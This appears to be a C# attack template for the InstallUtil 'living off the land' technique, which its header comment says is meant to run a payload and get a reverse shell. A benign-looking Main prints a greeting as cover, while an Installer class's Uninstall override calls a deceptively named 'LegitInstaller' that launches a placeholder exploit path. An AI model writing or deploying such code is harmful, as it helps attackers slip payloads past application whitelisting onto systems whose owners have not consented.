//Creates a living off the land through by utilizing InstallUti.exe to execute payload 
//to obtain reverse shell
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Greetings from Mars");
		Console.ReadKey();
	}
	
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	public override void Uninstall(System.Collections.IDictionary savedState)
	{
		LegitInstaller.Run();		
	}
	
}

public class LegitInstaller
{
	
	public static void Run()
	{
		Process.Start("Path to exploit");
		Console.ReadKey();

	}
 
}
